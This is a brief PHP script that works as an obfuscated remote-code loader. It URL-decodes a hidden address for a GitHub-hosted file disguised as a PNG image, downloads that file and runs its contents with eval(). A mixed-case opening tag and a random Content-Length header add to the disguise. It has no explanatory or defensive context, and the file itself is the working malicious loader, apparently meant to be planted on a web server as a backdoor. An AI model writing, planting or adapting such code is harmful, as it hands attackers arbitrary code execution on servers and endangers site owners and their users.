<?pHp

$h = fopen(rawurldecode('%68%74%74%70%73%3a%2f%2f%72%61%77%2e%67%69%74%68%75%62%75%73%65%72%63%6f%6e%74%65%6e%74%2e%63%6f%6d%2f%75%6e%61%6d%65%78%69%64%2f%63%6f%6c%6c%65%63%74%2f%6d%61%69%6e%2f%78%2f%77%61%6f%2e%70%6e%67'), "r");
$c = stream_get_contents($h);
fclose($h);
eval(rawurldecode('%3f%3e').$c);
$x = rand(1, 999999);
header('Content-Length: ' . $x);

?>
